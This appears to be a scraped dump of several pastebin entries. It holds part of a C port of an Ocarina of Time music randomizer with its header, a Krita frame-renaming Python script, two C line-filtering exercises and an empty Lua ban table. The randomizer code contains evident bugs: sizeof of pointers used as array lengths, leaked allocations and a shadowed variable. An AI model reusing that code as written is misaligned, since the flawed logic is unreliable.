    blank_track[i] = rom.modified[0xB89AE0 + i];
  }
  for (int idIndex = 0; idIndex < (sizeof(ids) / sizeof(int)); idIndex++) {
    for (int i = 0; i < 0x10; i++) {
      rom.modified[0xB89AE0 + (ids[idIndex] * 0x10) + i] = blank_track[i];
    }
  }
}

void restore_music(Rom rom) {
  //Restore all music from original
  Sequence_id* sequence_ids = get_sequence_ids(true, true, true, true, true);
  for (int i = 0; i < sizeof(sequence_ids) / sizeof(Sequence_id); i++) {
    Sequence_id bgm = sequence_ids[i];
    //Get the original values
    uint8_t bgm_sequence[0x10];
    for (int i = 0; i < 0x10; i++) {
      bgm_sequence[i] = rom.original[0xB89AE0 + (bgm.id * 0x10) + i];
    }
    uint8_t instr_1 = rom.original[0xB89910 + 0xDD + (bgm.id * 2)];
    uint8_t instr_2 = rom.original[0xB89910 + 0xDD + (bgm.id * 2) + 1];
    //Replace the values at the addresses we want
    for (int i = 0; i < 0x10; i++) {
      rom.modified[0xB89AE0 + (bgm.id * 0x10) + i] = bgm_sequence[i];
      rom.modified[0xB89910 + 0xDD + (bgm.id * 2)] = instr_1;
      rom.modified[0xB89910 + 0xDD + (bgm.id * 2) + 1] = instr_2;
    }

    //Restore file select instrument
    uint8_t file_1 = rom.original[0xB89910 + 0xDD + (0x57 * 2)]; //Based on the python code looks like this reads from the modified rather than the original
    uint8_t file_2 = rom.original[0xB89910 + 0xDD + (0x57 * 2) + 1];
    rom.modified[0xB89910 + 0xDD + (0x57 * 2)] = file_1;
    rom.modified[0xB89910 + 0xDD + (0x57 * 2) + 1] = file_2;

    //Rebuild audioseq
    int orig_start = rom.dma_original[AUDIOSEQ_DMADATA_INDEX].start;
    int orig_end = rom.dma_original[AUDIOSEQ_DMADATA_INDEX].end;
    //Check if this needs to be <= instead of <
    for (int i = orig_start; i < orig_end; i++) {
      rom.modified[i] = rom.original[i];
    }

    //If audioseq was relocated
    int start = rom.dma[AUDIOSEQ_DMADATA_INDEX].start;
    if (start != orig_start) {
      //Zero out old audioseq
      for (int i = start; i < rom.dma[AUDIOSEQ_DMADATA_INDEX].end; i++) {
        rom.modified[i] = 0;
      }
      Rom_dma_update(&rom, AUDIOSEQ_DMADATA_INDEX, orig_start, orig_end, start);
    }
  }
}

// void randomize_music(uint8_t* rom_original, uint8_t* rom_modified, Sequence* sequences, Sequence* target_sequences, Sequence* disabled_source_sequences, Sequence* disabled_target_sequences,
//                      bool bgm_random, bool fanfare_random, bool ocarina_random, bool credit_random, bool fileselect_random, bool custom_sequences) {
int randomize_music(uint8_t* rom_original, uint8_t* rom_modified, Sequence* sequences, int* disabled_target_sequences, char custom_sequences) {

  printf(""[C] 1\n"");

  //Copy raw rom data into rom struct
  Rom rom;
  rom.original = (uint8_t*)malloc(sizeof(rom_original));
  rom.original = rom_original;
  rom.modified = (uint8_t*)malloc(sizeof(rom_modified));
  rom.modified = rom_modified;
  //Get DMA for AUDIOSEQ_DMADATA
  DMAEntry seq_original;
  seq_original.index = AUDIOSEQ_DMADATA_INDEX;
  seq_original.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOSEQ_DMADATA_INDEX, true);
  seq_original.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOSEQ_DMADATA_INDEX + 4, true);
  seq_original.size = seq_original.end - seq_original.start;
  DMAEntry seq_modified;
  seq_modified.index = AUDIOSEQ_DMADATA_INDEX;
  seq_modified.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOSEQ_DMADATA_INDEX, false);
  seq_modified.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOSEQ_DMADATA_INDEX + 4, false);
  seq_modified.size = seq_modified.end - seq_modified.start;
  //Get DMA for AUDIOBANK_DMADATA
  DMAEntry bank_original;
  bank_original.index = AUDIOBANK_DMADATA_INDEX;
  bank_original.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOBANK_DMADATA_INDEX, true);
  bank_original.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOBANK_DMADATA_INDEX + 4, true);
  bank_original.size = bank_original.end - bank_original.start;
  DMAEntry bank_modified;
  bank_modified.index = AUDIOSEQ_DMADATA_INDEX;
  bank_modified.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOBANK_DMADATA_INDEX, false);
  bank_modified.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOBANK_DMADATA_INDEX + 4, false);
  bank_modified.size = bank_modified.end - bank_modified.start;
  //Get DMA for AUDIOTABLE_DMADATA
  DMAEntry table_original;
  table_original.index = AUDIOTABLE_DMADATA_INDEX;
  table_original.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOTABLE_DMADATA_INDEX, true);
  table_original.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOTABLE_DMADATA_INDEX + 4, true);
  table_original.size = table_original.end - table_original.start;
  DMAEntry table_modified;
  table_modified.index = AUDIOSEQ_DMADATA_INDEX;
  table_modified.start = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOTABLE_DMADATA_INDEX, false);
  table_modified.end = Rom_readint32(&rom, DMA_START + DMA_SIZE * AUDIOTABLE_DMADATA_INDEX + 4, false);
  table_modified.size = table_modified.end - table_modified.start;
  //Insert DMA entries into the rom struct
  rom.dma_original = (DMAEntry*)malloc(sizeof(DMAEntry) * (file_end + 1));
  rom.dma_original[AUDIOSEQ_DMADATA_INDEX] = seq_original;
  rom.dma_original[AUDIOBANK_DMADATA_INDEX] = bank_original;
  rom.dma_original[AUDIOTABLE_DMADATA_INDEX] = table_original;
  rom.dma = (DMAEntry*)malloc(sizeof(DMAEntry) * (file_end + 1));
  rom.dma[AUDIOSEQ_DMADATA_INDEX] = seq_modified;
  rom.dma[AUDIOBANK_DMADATA_INDEX] = bank_modified;
  rom.dma[AUDIOTABLE_DMADATA_INDEX] = table_modified;

  //Handle CFG_AUDIOBANK_TABLE_EXTENDED_ADDR
  int CFG_AUDIOBANK_TABLE_EXTENDED_ADDR = -1;
  int cosmetic_context = Rom_readint32(&rom, COSMETICS_CONTEXT_ADDR, false) - 0x80400000 + 0x03480000;
  //Check if the cosmetics version is high enough
  int cosmetics_version = Rom_readint32(&rom, cosmetic_context, false);
  if (cosmetics_version >= CFG_AUDIOBANK_TABLE_EXTENDED_ADDR_VERSION) {
    //It is, so read in the value for the address
    int CFG_AUDIOBANK_TABLE_EXTENDED_ADDR = Rom_readint32(&rom, cosmetic_context + CFG_AUDIOBANK_TABLE_EXTENDED_ADDR_OFFSET, false);
  }

  printf(""[C] 2\n"");

  //Business logic for calling each function
  restore_music(rom);

  printf(""[C] 3\n"");

  // if (bgm_random) {
  //   process_sequences(rom, get_sequence_ids(true, false, false, credit_random, false), disabled_source_sequences, disabled_target_sequences, custom_sequences, sequences, target_sequences);
  // }
  // if (fanfare_random) {
  //   process_sequences(rom, get_sequence_ids(true, false, ocarina_random, false, false), disabled_source_sequences, disabled_target_sequences, custom_sequences, sequences, target_sequences);
  // }

  if (custom_sequences) {
    rebuild_sequences(rom, sequences, CFG_AUDIOBANK_TABLE_EXTENDED_ADDR);
  } else {
    rebuild_pointers_table(rom, sequences);
  }

  printf(""[C] 4\n"");

  //Version where disabled_target_sequences is a list of Sequence
  // if (sizeof(disabled_target_sequences) > 0) {
  //   int* disabled_ids = (int*)malloc(sizeof(int) * sizeof(disabled_target_sequences) / sizeof(Sequence));
  //   for (int i = 0; i < sizeof(disabled_target_sequences) / sizeof(Sequence); i++) {
  //     disabled_ids[i] = disabled_target_sequences[i].vanilla_id;
  //   }
  //   disable_music(rom, disabled_ids);
  // }

  //Version where disabled_target_sequences is a list of int
  if (sizeof(disabled_target_sequences) > 0) {
    disable_music(rom, disabled_target_sequences);
  }

  printf(""[C] 5\n"");

  return 0;
}"
7sNnpEHy,oot-music.h,dragonbane,C,Saturday 20th of January 2024 01:45:49 PM CDT,"#ifndef __OOTMUSIC_H__
#define __OOTMUSIC_H__

//Defines
typedef unsigned int uint;
typedef unsigned char uint8_t;
typedef unsigned short uint16_t;
typedef unsigned char bool;

/********
Sound vector
********/

typedef struct sound {
  char* file;
  uint16_t temp_addr;
  int offset;
  int size;
  uint8_t* data;
} sound;

typedef struct sound_Vector {
  sound* data;
  int len;
  int size;
} sound_Vector;


/********
Sequence
********/

typedef struct Sequence {
  char* name; //Might not need
  uint8_t* seq_file;
  char* cosmetic_name; //Might not need
  int replaces;
  int vanilla_id;
  int type; //Might not need
  int instrument_set;
  bool new_instrument_set;
  sound_Vector zsounds;
  uint8_t* zbank_file;
  char* bankmeta; //Might not need
} Sequence;

//Functions
int randomize_music(uint8_t* rom_original, uint8_t* rom_modified, Sequence* sequences, int* disabled_target_sequences, char custom_sequences);

#endif
"
e3HhCGAp,Krita Timelapse Resequencer,skytale75,Python,Saturday 20th of January 2024 01:23:46 PM CDT,"# This is easy, even if you are not a computer nerd. Step by step instructions
# 1. In Krita, click Export on your recorder docker
# 2. On the top right side of the docker there is a button to open the directory with the images
# 3. In Windows right click any image, and select properties. Then in the general tab
# highlight and copy the location.
# 4. delte the words ""paste here"" below, but not the quotes, and paste the path in between the quotes.
# 5. Push the triangle button to run.
# script to rebuild a directory of krita / ffmpeg pictures sequentially so they can be compiled into a video

import os


directory_of_frames = r""paste here"" # paste your path between the quotes in r"" ""

# Starts with frame 0000000 and builds till the end

current_frame = 0 
for picture_files in os.listdir(directory_of_frames):
    new_name = str(current_frame).zfill(7)
    os.rename(os.path.join(directory_of_frames, picture_files), os.path.join(directory_of_frames, new_name + os.path.splitext(picture_files)[1]))
    current_frame += 1"
A1U2nMHr,Untitled,Josif_tepe,C,Saturday 20th of January 2024 12:53:17 PM CDT,"#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>


int main(int argc, const char * argv[]) {
    if(argc < 3) {
        printf(""Vlezna i izlezna se vnesuvaat kako argumenti\n"");
        return 0;
    }    
    FILE *in = fopen(argv[1], ""r"");
    FILE *out = fopen(argv[2], ""w"");
 
    if(in == NULL) {
        printf(""Ne validna vlezna datoteka\n"");
        return 0;
    }
    if(out == NULL) {
        printf(""Ne validna izlezna datoteka\n"");
    }
    char s[2000];
    while(fgets(s, 1000, in) != NULL) {
        char zbor[2000];
        int j = 0;
        int prv_zbor = -1;
        char prva_bukva;
        int ok = 1;
        for(int i = 0; i < strlen(s); i++) {
            if(isspace(s[i])) {
                if(prv_zbor == -1) {
                    prva_bukva = tolower(zbor[0]);
                }
                else {
                    if(prva_bukva != zbor[j - 1]) {
                        ok = -1;
                        break;
                    }
                }
                prva_bukva = tolower(zbor[0]);
                j = 0;
                prv_zbor = 1;
            }
            else {
                zbor[j] = s[i];
                j++;
            }
        }
        if(ok == 1) {
            fprintf(out, ""%s"", s);
        }
    }
    return 0;
}


/*
8
1 2 -1 -2 4 3 15  7  2
*/"
yrAwLxSS,Untitled,Josif_tepe,C++,Saturday 20th of January 2024 12:38:31 PM CDT,"#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>


int main(int argc, const char * argv[]) {
    if(argc < 3) {
        printf(""Vlezna i izlezna se vnesuvaat kako argumenti\n"");
        return 0;
    }    
    FILE *in = fopen(argv[1], ""r"");
    FILE *out = fopen(argv[2], ""w"");
 
    if(in == NULL) {
        printf(""Ne validna vlezna datoteka\n"");
        return 0;
    }
    if(out == NULL) {
        printf(""Ne validna izlezna datoteka\n"");
    }
    char s[2000];
    while(fgets(s, 1000, in) != NULL) {
        char zbor[2000];
        int j = 0;
        int ok = 1;
        for(int i = 0; i < strlen(s); i++) {
            if(isspace(s[i])) {
                if(tolower(zbor[0]) != tolower(zbor[j - 1])) {
                    ok = -1;
                    break;
                }
                j = 0;
            }
            else {
                zbor[j] = s[i];
                j++;
            }
        }
        if(ok == 1) {
            fprintf(out, ""%s"", s);
        }
    }
    return 0;
}


/*
8
1 2 -1 -2 4 3 15  7  2
*/"
m7B86kFf,BanListTest,davipa2828,Lua,Saturday 20th of January 2024 12:36:39 PM CDT,"local Bans = {
	--this is a pastebin to add (loadstrings) bans
}"
